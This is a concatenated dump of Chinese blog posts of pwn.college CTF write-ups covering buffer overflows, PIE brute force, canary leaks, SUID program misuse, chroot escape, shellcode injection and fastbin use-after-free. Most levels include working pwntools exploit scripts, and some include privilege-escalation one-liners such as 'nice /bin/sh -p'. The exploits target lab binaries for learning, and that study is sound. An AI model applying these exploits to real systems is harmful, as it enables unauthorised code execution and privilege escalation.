对于int型的负数强制类型转换，使得实际能输入的size变得非常大。所以这里其实相当于构建了一个整数溢出，然后绕过了size后面就比较常规了。 1234567891011121314151617from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;#p = process(&quot;./babymem_level4.0&quot;)p = process(&quot;/challenge/babymem_level4.0&quot;)#pad = 0x401B5 #0x30win_addr = 0x401B88payload = b&quot;a&quot;*40+ p64(win_addr)p.sendline(b&quot;-999&quot;)#gdb.attach(p)p.send(payload)p.interactive() ​ Level4.1​ 漏洞点： 1if ( (signed int)v5 &gt; 30 ) ​ 依然是利用强制类型转换将本来是uint的v5变成int来与30比较，形成整数溢出。 1234567891011121314151617from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;#p = process(&quot;./babymem_level4.1&quot;)p = process(&quot;/challenge/babymem_level4.1&quot;)#pad = 0x401B5 #0x30win_addr = 0x4016A3payload = b&quot;a&quot;*56+ p64(win_addr)p.sendline(b&quot;-999&quot;)#gdb.attach(p)p.send(payload)p.interactive() Level5.0​ 这个题依然是在输入size的地方进行了一定的检测，这里是 12if ( v31 * v32 &gt; 7 ) sub_401150(&quot;record_size * record_num &lt; (unsigned int) sizeof(input)&quot;, &quot;&lt;stdin&gt;&quot;, 143LL, &quot;challenge&quot;); ​ ​ 然后虽然可以输入负数，但是如果随便输的话会导致溢出到下一个payload的read的buffer，导致输入不了，程序直接爆炸。真的非常逆天。 ​ 4294967297是1， ​ 18446744073709551617 2147483649 ​ 去找了一下官方的teaching，发现思路其实并不是uint与int之间的强制类型转换，而是uint32和uint64之间强制类型转换导致的溢出。除了最后的size计算时，将v33转化成uint64，其他的变量都是uint32， 1234567891011121314151617from pwn import*p = process(&quot;/challenge/babymem_level5.0&quot;)win = 0x4022E7#payload = b&#x27;a&#x27;*40+b&quot;\\x48&quot;+ b&quot;a&quot;*2payload = b&#x27;a&#x27;*136 + p64(win)#80+8 canary:16p.sendline(b&quot;2147483649&quot;)p.sendline(b&quot;2&quot;)p.send(payload)p.interactive() Level5.1123456789101112131415from pwn import*p = process(&quot;/challenge/babymem_level5.1&quot;)win = 0x40173B#payload = b&#x27;a&#x27;*40+b&quot;\\x48&quot;+ b&quot;a&quot;*2payload = b&#x27;a&#x27;*88 + p64(win)#80+8 canary:16p.sendline(b&quot;2147483649&quot;)p.sendline(b&quot;2&quot;)p.send(payload)p.interactive() Level6.0​ 利用gadget的思想，直接将地址填成flag，而绕过win的检测。 123456789101112131415161718from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;#p = process(&quot;./babymem_level5.0&quot;)p = process(&quot;/challenge/babymem_level6.0&quot;)#gdb.attach(p)#pad = 0x401B5 #0x30win_addr = 0x401693payload = b&quot;a&quot;*152+ p64(win_addr)p.sendline(&quot;160&quot;)p.recv()p.send(payload)p.interactive() Level6.1​ 同理。 1234567891011121314151617181920from pwn import*context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&quot;./babymem_level6.1&quot;)#p = process(&quot;/challenge/babymem_level6.1&quot;)gdb.attach(p)#pad = 0x401B5 #0x30win_addr = 0x4013BApayload = b&quot;a&quot;*152+ p64(win_addr)p.sendline(&quot;160&quot;)p.recv()p.send(payload)p.interactive() Level7.0​ 开始考pie的绕过了，不走寻常路啊。 ​ 之前讲到pie的绕过，一般是部分覆写，以及脚本爆破。 ​ 地址的后三个字符永远一致，所以只需爆破第四位，就能将retn覆盖成win 。 ​ （话说如此我其实从来没有写过爆破pie的脚本。。。。所以说为什么不走寻常路，别的题一般都是五花八门的glibc或者漏洞点，然后用pie增加难度。没有pie做不出来，有pie更加做不出来了，然而这个题目就纯纯地考pie，真的牛） 123456789101112131415161718from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;#p = process(&quot;./babymem_level7.0&quot;)p = process(&quot;/challenge/babymem_level7.0&quot;)#gdb.attach(p)#pad = 0x401B5 #0x30payload = b&quot;a&quot;*136+ b&quot;\\xf4\\xbb&quot;p.sendline(&quot;144&quot;)p.recv()p.send(payload)p.interactive() 多执行，总会爆出来的，不过爆之前先在本地调一调，不然有什么错的地方就冤大头了。 Level7.112345678910111213141516171819from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;#p = process(&quot;./babymem_level7.1&quot;)p = process(&quot;/challenge/babymem_level8.0&quot;)#pad = 0x401B5 #0x30payload = b&quot;a&quot;*152+ b&quot;\\xa4\\xb0&quot;p.sendline(&quot;160&quot;)p.recv()#gdb.attach(p)p.send(payload)p.interactive() Level8.0​ 好像是又对输入size做了过滤。所以就用到另外一个trick，就是针对strlen的check可以用空字符绕过。 12345678910111213141516171819from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;#p = process(&quot;./babymem_level8.0&quot;)p = process(&quot;/challenge/babymem_level8.0&quot;)payload = b&#x27;\\x00&#x27;*152 + b&quot;\\xa4\\xb0&quot;p.sendline(&quot;160&quot;)p.recv()p.send(payload)p.interactive() Level8.1​ 同理 1234567891011121314151617from pwn import*context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&quot;./babymem_level8.1&quot;)#p = process(&quot;/challenge/babymem_level8.1&quot;)payload = b&#x27;\\x00&#x27;*104 + b&quot;\\x7e\\x79&quot;p.sendline(&quot;112&quot;)p.recv()gdb.attach(p)p.send(payload)p.interactive() Level9.0​ 以程序构造出的漏洞将输入写在canary后。这里需要写104个padding，同时72个padding加上\\x60直接绕到canary后覆写。 12345678910111213from pwn import*p = process(&quot;/challenge/babymem_level9.1&quot;)payload = b&#x27;a&#x27;*72+b&quot;\\x60&quot;+ b&quot;\\xbe\\xc5&quot;*6p.sendline(&quot;106&quot;)p.recv()p.send(payload)p.interactive() Level9.1 123456789101112from pwn import*p = process(&quot;/challenge/babymem_level9.1&quot;)payload = b&#x27;a&#x27;*40+b&quot;\\x47&quot;+ b&quot;\\x26\\x46&quot;p.sendline(&quot;77&quot;)p.recv()p.send(payload)p.interactive() ​ n的数量和size都需要精准控制才能拿flag。 Level10.0​ 其实虽然盯着伪代码盯了很久但是感觉并没有实际理解这道题。目前我的疑惑有二： 为什么flag被load进了内存，并且也给出了它在栈中实际的地址，但是栈上对应的地址显示的是0. 这道题的思路应该是通过后面那个you say来打印flag，但是如何将payload的指针覆盖为flag的指针？ ​ ​ 解答一下，第一个问题其实很不应该，显示为0就是因为没有权限。然后第二个问题，覆盖payload指针的思路至少不应该在这个module出现，这道题的漏洞点就是payload的区域和flag的区域在栈上是连续的，只要覆盖掉截断payload的输出的空字符就可以一直输出栈上的内容，包括flag。 ​ ps，包括其他题也是，如果有疑惑其实可以找一下官方的teaching视频（但是也有很多没有就是了） ​ 1234567891011from pwn import*p = process(&quot;/challenge/babymem_level10.0&quot;)payload = b&#x27;a&#x27;*111p.sendline(b&quot;150&quot;)p.send(payload) Level10.1​ 同 12345678910111213from pwn import*p = process(&quot;/challenge/babymem_level10.1&quot;)payload = b&#x27;a&#x27;*79p.sendline(b&quot;150&quot;)p.send(payload)p.interactive() Level11.0​ 也是类似的思路，但是这里倒不是栈地址了，不过区别不大，只是输入的payload大些。 12345678910from pwn import*p = process(&quot;/challenge/babymem_level11.0&quot;)#payload = b&#x27;a&#x27;*40+b&quot;\\x48&quot;+ b&quot;a&quot;*2payload = b&#x27;a&#x27;*24577p.sendline(b&quot;24600&quot;)p.send(payload)p.interactive() level11.1​ 同理 ​ （ps：size是我随便填的。但是也不能太随便，得先vmmap看看flag和input buffer被映射到了哪里） 123456789101112from pwn import*p = process(&quot;/challenge/babymem_level11.1&quot;)payload = b&#x27;a&#x27;*12289p.sendline(b&quot;12400&quot;)p.send(payload)p.interactive() level12.0​ 这道题的trick就在于可以反复调用函数challenge，每一次调用虽然栈会被clear但是canary不变，从而泄露canary。思路其实比较简单，但是调试有些令人恼火。 123456789101112131415161718from pwn import*p = process(&quot;/challenge/babymem_level12.0&quot;)payload1 = b&#x27;a&#x27;*35+b&quot;REPEAT&quot;p.sendline(b&quot;41&quot;)p.send(payload1)p.recvuntil(&#x27;You said:&#x27;)canary = u64(p.recv()[41:49])canary -= 0x54payload2 = b&#x27;a&#x27;*41 + p64(canary) + b&#x27;a&#x27;*8 + b&quot;\\x91\\xb0&quot;p.send(&#x27;100&#x27;)p.send(payload2)p.interactive() Level12.1​ 同理，但是需要好好调。 1234567891011121314151617181920212223242526from pwn import*context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&quot;./babymem_level12.1&quot;)payload1 = b&#x27;a&#x27;*83+b&quot;REPEAT&quot;p.sendline(b&quot;89&quot;)gdb.attach(p)p.send(payload1)p.recvuntil(&#x27;You said:&#x27;)canary = u64(p.recv()[89:97])canary -= 0x54print(hex(canary))payload2 = b&#x27;a&#x27;*89 + p64(canary) + b&#x27;a&#x27;*8 + b&quot;\\x63\\x18&quot;p.send(&#x27;112&#x27;)p.send(payload2)pause()p.interactive() level13.0​ 。。输几个a就有flag，具体方法看13.1。 level13.1​ 我觉得是最简单的level了。。 ​ 找到input buffer和flag间地址的填充量，填大于等于的a就行，数量没有必要精确。这个题脚本都没有写，实在太傻逼了。 level14​ 其实我觉得这个题没有写的必要了，纯纯的就是13和12的结合。 level15.0​ 一个奇怪的socket网络通信，我觉得思路是通过fork多个子进程来leak canary，但是由于从来没有接触过，所以先研究一会儿吧。","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"ProgramMisuse","slug":"pwn.college_ProgramMisuse","date":"2022-03-03T03:09:26.547Z","updated":"2022-03-20T04:32:28.825Z","comments":true,"path":"2022/03/03/pwn.college_ProgramMisuse/","link":"","permalink":"https://fuurinko.github.io/2022/03/03/pwn.college_ProgramMisuse/","excerpt":"","text":"​ 关于这个module，做出题目的话大致有两个思路，一个是利用/bin/sh 来对整个shell提权，另外一个是利用设置了suid的特殊程序来读取flag。一般来说是第二个方法比较简单，但是有时候只有第一个方法可以行得通。 Level1​ 没有看视频，并不知道这个Misuse是什么意义，但是level1只要执行给的程序就能get flag。 Level2​ 到第二题大概懂它的用意了，来补充一些知识吧。 ​ ​ 可以看到原本我们只用普通用户权限，但是由于可执行程序将 /usr/bin/more 设置为了超级权限，使得这个功能能够读取到flag的内容。 ​ 然后关于SUID，也就是Set uid ID。如果将对应位设置为S，就能够以可执行文件的owner权限执行它们。 ​ （SUID）仅对二进制可执行文件有效。 参考：[Linux 特殊权限 SUID,SGID,SBIT ] Level3-9​ xxx flag Level 10​ 指令为rev，所以对于获得的flag我们需要翻转一下，可以就直接用rev来。 Level 11​ 控制od的参数，并需要简单的脚本处理字符串的空格。 Level12-17​ 按照给的可执行文件来。 ​ 之前碰到这个问题的时候并咩有理解，现在算是理解了。 Level21ar -r a flag cat a Level27nice /bin/sh -p Level28 Level29​ 利用stdbuf设置输出缓冲为0，利用/bin/sh执行并提权。 Level30​ Level34 Level35 Level36 Level37 Level38 level39 Level41Level42 Level45 Level47 Level49","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"Sandboxing","slug":"pwn.college_Sandboxing","date":"2022-02-28T13:59:27.326Z","updated":"2022-03-20T04:32:53.988Z","comments":true,"path":"2022/02/28/pwn.college_Sandboxing/","link":"","permalink":"https://fuurinko.github.io/2022/02/28/pwn.college_Sandboxing/","excerpt":"","text":"Level1​ 首先考察chroot ​ 因为程序在将根目录设置为/jail的时候并没有切换当前工作目录为/jail，所以我们实际上还是在/目录，因此可以直接通过argv[1] 读取flag。 ​ 执行脚本的时候需要添加cwd参数，使其工作目录为/ Level2123shellcode = asm(shellcraft.readfile(&#x27;flag&#x27;,1))p = process([&quot;/challenge/babyjail_level2&quot;, &quot;/&quot;],cwd=&#x27;/&#x27;)p.send(shellcode) Level3​ 关键源码： 1234567891011121314151617181920212223242526assert(argc &gt; 1); puts(&quot;Checking to make sure you&#x27;re not trying to open the flag.\\n&quot;); assert(strstr(argv[1], &quot;flag&quot;) == NULL); int fd = open(argv[1], O_RDONLY|O_NOFOLLOW); if (fd &lt; 0) printf(&quot;Failed to open the file located at `%s`.\\n&quot;, argv[1]); else printf(&quot;Successfully opened the file located at `%s`.\\n&quot;, argv[1]); char jail_path[] = &quot;/tmp/jail-XXXXXX&quot;; assert(mkdtemp(jail_path) != NULL); printf(&quot;Creating a jail at `%s`.\\n&quot;, jail_path); assert(chroot(jail_path) == 0); puts(&quot;Moving the current working directory into the jail.\\n&quot;); assert(chdir(&quot;/&quot;) == 0); int fffd = open(&quot;/flag&quot;, O_WRONLY | O_CREAT); write(fffd, &quot;FLAG&#123;FAKE&#125;&quot;, 10); close(fffd);","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"ReverseEngineering","slug":"pwn.college_ReverseEngineering","date":"2022-02-14T20:11:23.367Z","updated":"2022-03-20T04:32:48.611Z","comments":true,"path":"2022/02/15/pwn.college_ReverseEngineering/","link":"","permalink":"https://fuurinko.github.io/2022/02/15/pwn.college_ReverseEngineering/","excerpt":"","text":"Level1.0 Level1.1​ 同上，一样的做法。 Level2.0​ 交换idx3和idx4的位置 Level2.1​ 交换idx1和idx4. ​ ps： ​ 输入五个字符，转化为ascii后以int类型贮存，从栈布局可以看出v10大小是4个字，所以第五个字被储存在v11。 Level3.0​ reverse Level3.1​ 同上。 Level4.0123456789101112for ( j = 0; j &lt;= 3; ++j ) &#123; for ( k = 0; k &lt; 4 - j; ++k ) &#123; if ( *((_BYTE *)&amp;v15 + k - 14) &gt; *((_BYTE *)&amp;v15 + k - 13) ) &#123; v4 = *((_BYTE *)&amp;v15 + k - 14); *((_BYTE *)&amp;v15 + k - 14) = *((_BYTE *)&amp;v15 + k - 13); *((_BYTE *)&amp;v15 + k - 13) = v4; &#125; &#125; &#125; ​ 一个简单的冒泡排序算法。 level4.1​ 同上 Level5.012for ( j = 0; j &lt;= 4; ++j ) *((_BYTE *)&amp;v13 + j - 14) ^= 0xCDu; ​ 异或加密，需要用到简单的脚本（手抠也不是不行） Level5.1​ 同上，好饿。 Level6.0​ 可以批量导出数据，避免手动处理数组 ​ 程序的逻辑是输入的字符串进行降序排序-&gt;条件异或，我们需要通过结果反推输入值， ​ 因为程序一定会对字符串进行降序排序，所以输入字符串的顺序其实意义不大，无论是怎么打乱，最后处理的结果都是一样的。 12345678910x = [0x64, 0x59, 0x60, 0x59, 0x7F, 0x40, 0x77, 0x4E, 0x77, 0x4C, 0x75, 0x4D, 0x73, 0x4B, 0x71]for i in range(15): if (i % 2 == 0): x[i] ^= 0x10 else: x[i] ^= 0x29 a = chr(x[i]) print(a)","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"Debugging Refresher","slug":"pwn.college_Debugging Refresher","date":"2022-02-14T08:16:26.477Z","updated":"2022-03-20T04:31:15.149Z","comments":true,"path":"2022/02/14/pwn.college_Debugging Refresher/","link":"","permalink":"https://fuurinko.github.io/2022/02/14/pwn.college_Debugging%20Refresher/","excerpt":"","text":"Level1​ 直接r，然后c到断点。 Level2​ p/x $r12 Level3​ 不好描述，可以根据后面的正确随机数在栈中找到对应的位置，然后重新执行并输入。 Level4​ 。。。。 Level5gdb脚本。","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"Assembly_Refresher","slug":"pwn.college_Assembly_Refresher","date":"2022-01-29T13:51:29.070Z","updated":"2022-04-09T08:30:47.947Z","comments":true,"path":"2022/01/29/pwn.college_Assembly_Refresher/","link":"","permalink":"https://fuurinko.github.io/2022/01/29/pwn.college_Assembly_Refresher/","excerpt":"","text":"Level1需要设置*rdi = 0x1337， 如果是按照目的意思程序的汇编代码长这样子： 12345.section .text .intel_syntax noprefix .global _start _start : mov rdi, 0x1337 但是可以直接用pwntools传输mov rdi, 0x1337这一句。 12345678910111213#!/usr/bin/env python3import pwnpwn.context.log_level = &quot;INFO&quot;pwn.context.encoding = &quot;latin&quot;pwn.context.arch = &quot;amd64&quot;pwn.warnings.simplefilter(&quot;ignore&quot;)assembly = &quot;&quot;&quot;mov rdi, 0x1337&quot;&quot;&quot;proc = pwn.process(&quot;/challenge/embryoasm_level1&quot;)print(proc.readrepeat(1).decode())proc.send(pwn.asm(assembly))print(proc.readrepeat(1).decode()) 一个好用的exp，可以直接在非根目录下执行。 Level2add rdi, 0x331337 Level3 出师未捷身先死。 这里应该是对于汇编乘法对于寄存器的改变不太清楚 ​ 问题出在64位乘法会产生128位乘积，储存在rdx:rax中由于题目给的都是低32位的所以高32位全部是0，相当于mul之后rdx就变成了0，自然拿不到flag。 Level4​ 简单的64位汇编除法。相关的指令都已经给出了，抄作业就行。 Level5​ 依然是简单的除法，涉及到余数的处理。既然余数存在rdx，mov rax，rdx就行。 Level6​ 对于低位的数字运算（好烦）， 12rax = rdi modulo 256 ;2^8rbx = rsi module 65536 ;2^16 ​ 所以edi和esi没有低八位吗？ 可能是吧，就像正常来说ebp和esp也没有低八位。 Level7​ 进行移位操作的练习，需要让rax为rdi的b3位的值 ​ Level8​ 与操作。 Level9​ 简单的奇偶判断，rax应该是1与rdi lsb异或后的结果。 Level10​ 简单的间接寻址。 ​ 要注意的是这里面有一些规范，大概就是不能mov [register],number;。也就是说涉及到寄存器间接寻址的操作都不能用立即数，而是需要利用寄存器。 Level11​ 涉及对byte，word ，dword和qword的size的理解。 Level12​ 我发现这个东西最恼人的不是做本身而是看题，不想看题好烦，题好长。但是只看问题又不能瞬间找到思路。。。 ​ 考点是利用寄存器间接寻址设置寄存器的值为指定值。（本来以为要考虑小端序造成的影响但其实不用考虑） ​ Level13​ 也就是一个按照地址偏移寻址的方式的理解。（基址寻址） Level14​ 对于出入栈相关指令的简单理解。 ​ 做题的时候卡了一下，因为没有正确理解题意，我以为是需要把栈顶值减去rdi后的值存到rax中就行，但是题意其实是让我们改变栈顶的值，所以我们将rax取出减rdi后还需要push回去。（还是吃了英语不好的亏捏） ​ Level15​ 还是围绕栈的先入后出的练习。 ​ ​ Level16​ 利用rsp来寻址。 ​ ​ 这里我把rdx清零了，属于是多此一举。 Level17​ 这题干怎么越来越长。 ​ 等会儿再做。 ​","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"Shellcode_Injection","slug":"pwn.college_Shellcode_Injection","date":"2022-01-29T09:37:52.632Z","updated":"2022-07-09T13:36:22.203Z","comments":true,"path":"2022/01/29/pwn.college_Shellcode_Injection/","link":"","permalink":"https://fuurinko.github.io/2022/01/29/pwn.college_Shellcode_Injection/","excerpt":"","text":"​ 整个专题其实就是一个shellcode编写的小练习，并不需要自己寻找漏洞点，写好shellcode直接注入就行。 ​ 如果要将服务器的文件传输到本地的话可以使用: 1scp -i key -r hacker@dojo.pwn.college:/challenge [本地路径] Level1​ 可以用pwntools的shellcraft模块，但是也可以手写shellcode。 ​ 这道题可以用简单的orw的思路做。但是shellcode的地址需要在规定的地方。至于为什么，可能只有这一块可写可读？ 123shellcode = shellcraft.amd64.open(&quot;/flag&quot;) shellcode += shellcraft.amd64.read(&#x27;rax&#x27;, addr + 0x100, 0x100)shellcode += shellcraft.amd64.write(1, addr + 0x100, 0x100) Level21234shellcode = shellcraft.amd64.nop()*0x800shellcode = shellcraft.amd64.open(&quot;/flag&quot;) shellcode += shellcraft.amd64.read(&#x27;rax&#x27;, stack + 0x100, 0x100)shellcode += shellcraft.amd64.write(1, stack + 0x100, 0x100) Level3​ 还是和第一个差不多。 Level4​ shellcode不能含有”H”。 ​ 第一个想到的就是不能含有push，其他指令似乎也没有h了。想要完成的话第一个思路是手写不含push的shellcode，另外一个思路是构造跳板读取其他位置的shellcode（这种思路其实比较常见并且配套的视频中也提到过） ​ 但是实际做题体验极差，写了read()后，读取的shellcode无论怎样都无法读到flag，明明已经getshell了，也没有eof，但是就是没办法。以后再想吧。 ​ Level5 ​ 需要让shellcode在运行时生成syscall()。 ​ 之前我是没有思路的，但是后面看到一个师傅对于shellcode的总结里提到对于shellcode的过滤中有禁止系统调用命令这个类别，也就是其实只要输入可见字符串就好了。关于这一点，比较方便的就是利用可见字符shellcode生成工具，比较牛逼的可以利用对应指令集手写。也就是 int 0x80 ; syscall通过xor sub and inc dec运算来操作。 ​","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"Program_interaction","slug":"pwn.college_Program_interaction","date":"2022-01-17T13:30:41.758Z","updated":"2022-03-20T04:32:14.067Z","comments":true,"path":"2022/01/17/pwn.college_Program_interaction/","link":"","permalink":"https://fuurinko.github.io/2022/01/17/pwn.college_Program_interaction/","excerpt":"","text":"「前面不太记得了，从level3记起」 level3 ./embryoio_level3 xkbdyoisnx Level4export jouixn = xxx Level5​ 一个标准输入重定向的考察， ./embryoio_level5 &lt; /tmp/mihsjr ​ 还需要编辑mihsjr 的内容为给的密码。 Level6​ 一个输出重定向，创建对应文件./embryoio_level6 &gt; /tmp/ptyaid ，flag在ptyaid中。 Level7env -i ./xxx Level8​ 写个sh脚本，内容是打开这个题目。注意路径。 12hacker@embryoio_level8:~$ cat my_script.sh /challenge/embryoio_level8 Level9​ 与level8同理，顺手输个密码就行。 Level10​ 同level3 Level11​ 同level4。 Level12​ 同level5 Level13​ 同level6 Level14​ 同level7 Level15​ 一言难尽，可以在ipython里用pwntools。 Level16​ 同15。 Level17​ 这几个level就是将python与之前level的命令行参数或者环境变量结合，虽然难度不高但是很考验pwntools运用的熟练度。所以我还没有找到做出来的方法。 Level18​ 利用python设置环境变量，主要利用到os.environ或者os.putenv函数。 Level19​","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"unsortedbinleak","slug":"heap_unsortedbin leak","date":"2021-12-11T11:32:01.748Z","updated":"2022-04-09T00:53:50.406Z","comments":true,"path":"2021/12/11/heap_unsortedbin leak/","link":"","permalink":"https://fuurinko.github.io/2021/12/11/heap_unsortedbin%20leak/","excerpt":"","text":"​ 一个简单的trick。 ​ 并且在trick就是tcache，接下来就是刷题熟练，最后再简单学习一下largin bin和small bin的利用。 ​ unsortedbin 由双向循环链表管理，表头为main_arena，所以表末尾的chunk的fd会指回main_arena，这样我们就获得了main_arena结构体内部的的地址，通过调试我们就能得到main_arena的真正的地址，并且main_arena与libc基地址有固定偏移，就能四舍五入获得libc的基地址。 ​ 如何泄露这个fd呢？ ​ 一般情况下，可以利用UAF，show出 unsorted chunk的fd。 ​ 当bin中只有一个chunk时，由于bin中一般都是干净的，该bin的fd和bk都会指向main_arena中 ​ 那么如何得到main_arena与libc的固定偏移呢？ ​ 有两种方式： ​ 1:用IDA找到.so文件的 malloc_trim 函数，就可以获得偏移。 123456789101112131415161718192021int__malloc_trim (size_t s)&#123; int result = 0; if (__malloc_initialized &lt; 0) ptmalloc_init (); mstate ar_ptr = &amp;main_arena;//&lt;=对main_arena进行了访问，用伪代码看到的结果就是main_arena和libc的固定偏移。 do &#123; __libc_lock_lock (ar_ptr-&gt;mutex); result |= mtrim (ar_ptr, s); __libc_lock_unlock (ar_ptr-&gt;mutex ar_ptr = ar_ptr-&gt;next; &#125; while (ar_ptr != &amp;main_arena); return result;&#125; ​ 2:通过malloc_hook算出。 1main_arena_offset = ELF(&quot;libc.so.6&quot;).symbols[&quot;__malloc_hook&quot;] + 0x10","categories":[{"name":"HEAP - Unsortedbin","slug":"HEAP-Unsortedbin","permalink":"https://fuurinko.github.io/categories/HEAP-Unsortedbin/"}],"tags":[{"name":"learning","slug":"learning","permalink":"https://fuurinko.github.io/tags/learning/"}]},{"title":"positive sp value has been found","slug":"mess_ida 7.0 for mac疑难杂症： positive sp value has been found","date":"2021-12-10T08:05:39.212Z","updated":"2022-04-09T08:40:06.440Z","comments":true,"path":"2021/12/10/mess_ida 7.0 for mac疑难杂症： positive sp value has been found/","link":"","permalink":"https://fuurinko.github.io/2021/12/10/mess_ida%207.0%20for%20mac%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87%EF%BC%9A%20positive%20sp%20value%20has%20been%20found/","excerpt":"","text":"0）​ 自从抛弃虚拟机，利用ida for mac+pwndocker实现完全mac环境以后，深觉优雅的同时，也遇见了不少坑。 ​ 其中ida的坑更是坑人于无形之中。因为如果不打开win的7.5（甚至7.6）做对比，你甚至不知道你遇见的一些奇怪的东西，是7.0 mac版特有的，已经被优化了的坑，还是自身逆向水平问题。 ​ 作为一个逆向废物，7.0 for mac属实是给本来就逆不出的我雪上加霜，但是就算是这样，我也宁愿花时间解决问题，而不是重新回到虚拟机win的悲惨过往，因为这不优雅。（优雅这个词到底害死了多少人捏） 1）​ 目前碰到的最多的一个问题，就是： ​ ​ 其实这个严格来讲算不上问题，因为你只需要找到main函数再f5，照样能够反编译，但是每次弹出的这个框就让我很恼火。所以解决问题的目标在于修改ida使得不再弹出这个框，而不是修改程序治标不治本捏。 ​ 对于问题本身，其实还是比较常规，只需要patch一下就好了。 ​ 我这里是_start()堆栈不平衡， ​ ​ 问题显然出在and rsp, 0FFFFFFFFFFFFFFF0h到start结束的这一大段。call完main以后居然没有retn。 ​ 首先报堆栈不平衡的错误大概就是因为ida要求stack pointer在函数开头和结束时相等。然后导致堆栈不平衡，通常是因为程序本身含有代码混淆/花指令，但是这是一道pwn题，为什么要在这种地方为难人。 ​ 我超，流汗黄豆原来是为难的意思。 ​ ​ 首先最让我疑惑的就是末尾的hlt指令，它取代了retn，然后它的意思是暂停指令，而不是返回。为什么这个地方会有一条这样的指令，是程序原本设计的还是ida反编译的问题？ ​ 稍微学习了一下，意识到start函数是被拆成了三个部分，所以只反编译一个部分肯定有问题。 ​ 但是虽然这样堆栈平衡，但是还是无法反编译，我也不清楚里面是不是有什么花指令。 ​ 和胖爷爷交流了一下，7.5及以上也会出现这个错误，但是完全可以反编译，并且start就是只有那么一段，没有后面的一堆东西。我不理解，我也修复不了，这篇文章毫无意义，但是学习了一些修复堆栈不平衡的方法（ ）参考​ IDA出现”sp-analysis failed”和F5(反编译)失败 ​","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://fuurinko.github.io/tags/%E9%80%86%E5%90%91/"}]},{"title":"fastbin attack","slug":"heap_learning_fastbin_attack","date":"2021-12-06T08:17:00.507Z","updated":"2022-04-13T16:42:34.639Z","comments":true,"path":"2021/12/06/heap_learning_fastbin_attack/","link":"","permalink":"https://fuurinko.github.io/2021/12/06/heap_learning_fastbin_attack/","excerpt":"","text":"fastbin​ 长度在32-160(32位系统是16-80)的free堆块。通过fastbinlist储存，单向链表，所以fast。fastbin attack一个最简单的利用就是UAF，其次就是fastbin double free。ctf pwn中与fastbin相关的还有就是在unsortedbin attack中涉及到的，也是ptmalloc机制中的一种的malloc_consolidate，其中也有可以攻击的机会，但是这个内容日后再在unsortedbin attack的笔记中再进行研究吧。 UAF​ 先从一个简单的例子开始： hacknote题目链接 ​ 菜单题，增删查改一应俱全，同时还有后门函数。那么利用思路就是利用悬垂指针，将后门函数的地址覆盖堆指针，使得调用print_note实则是在调用后门函数。 ​ 然后来详细分析一下题目的逻辑。 ​ 在add_note()中，对于每个note，程序分配了两个堆块，一个chunk储存结构体note的两个字段：printnote 的指针和content的指针，一共是8字节，另一个chunk则储存内容，size由用户输入决定。 ​ 每个note的chunk的地址是连续的。 ​ 我们连续申请两个note。 12addnote(32, &quot;aaaa&quot;) # add note 0addnote(32, &quot;ddaa&quot;) # add note 1 ​ 可以看到从158开始就是第一个chunk0的指针，8字节没有问题。然后168开始是content chunk。顺带一提0x11=是因为八字节的user space+8字节的chunk头以及最低位1的inuse。0x31则是因为对齐补全而多了八字节，也就是0x20（user space）+0x8（chunk头）+0x8（对齐）+最低位置1。 ​ 然后我们分别释放这两个chunk。 